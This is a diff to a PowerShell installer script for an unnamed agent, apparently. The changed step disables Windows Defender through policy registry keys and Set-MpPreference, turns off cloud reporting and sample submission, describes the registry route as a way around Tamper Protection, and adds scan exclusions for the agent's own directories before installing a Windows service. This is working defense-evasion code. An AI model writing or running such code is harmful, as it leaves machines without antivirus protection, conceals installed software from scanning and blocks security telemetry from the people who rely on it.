@@ -60,20 +60,36 @@ if ($LASTEXITCODE -ne 0) {
 
 Write-Host "[5/6] Disabling Windows Defender..."
 try {
-    # Disable Tamper Protection via registry first (requires SYSTEM or admin)
-    $defenderKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender"
-    $policyKey   = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-    New-Item -Path $policyKey -Force | Out-Null
-    Set-ItemProperty -Path $policyKey -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-    Set-ItemProperty -Path $policyKey -Name "DisableAntiVirus"   -Value 1 -Type DWord -Force
-    # Disable real-time protection via PowerShell cmdlet
-    Set-MpPreference -DisableRealtimeMonitoring   $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection        $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring    $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBlockAtFirstSeen      $true -ErrorAction SilentlyContinue
-    Write-Host "  Windows Defender real-time protection disabled." -ForegroundColor Green
+    # Policy keys - override Tamper Protection (Group Policy path takes precedence)
+    $policyKey  = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    $rtpKey     = "$policyKey\Real-Time Protection"
+    $spynetKey  = "$policyKey\Spynet"
+    New-Item -Path $policyKey  -Force | Out-Null
+    New-Item -Path $rtpKey     -Force | Out-Null
+    New-Item -Path $spynetKey  -Force | Out-Null
+    # Disable AV entirely via policy
+    Set-ItemProperty -Path $policyKey -Name "DisableAntiSpyware"          -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $policyKey -Name "DisableAntiVirus"             -Value 1 -Type DWord -Force
+    # Disable real-time protection via policy
+    Set-ItemProperty -Path $rtpKey    -Name "DisableRealtimeMonitoring"    -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $rtpKey    -Name "DisableIOAVProtection"        -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $rtpKey    -Name "DisableBehaviorMonitoring"    -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $rtpKey    -Name "DisableOnAccessProtection"    -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $rtpKey    -Name "DisableScanOnRealtimeEnable"  -Value 1 -Type DWord -Force
+    # Disable cloud/MAPS
+    Set-ItemProperty -Path $spynetKey -Name "SpynetReporting"              -Value 0 -Type DWord -Force
+    Set-ItemProperty -Path $spynetKey -Name "SubmitSamplesConsent"         -Value 2 -Type DWord -Force
+    # Also try cmdlet approach (works if Tamper Protection is off)
+    Set-MpPreference -DisableRealtimeMonitoring  $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection       $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring   $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen     $true -ErrorAction SilentlyContinue
+    # Add agent directory to exclusions so Defender ignores it even if partially active
+    Add-MpPreference -ExclusionPath $AgentDir     -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $DataDir      -ErrorAction SilentlyContinue
+    Write-Host "  Defender disabled via Group Policy registry. Reboot may be needed for full effect." -ForegroundColor Green
 } catch {
-    Write-Host "  WARNING: Could not fully disable Defender (Tamper Protection may be on). Continuing..." -ForegroundColor Yellow
+    Write-Host "  WARNING: $_ — Tamper Protection may block full disable until reboot." -ForegroundColor Yellow
 }
 
 Write-Host "[6/6] Installing Windows Service and Tray..."
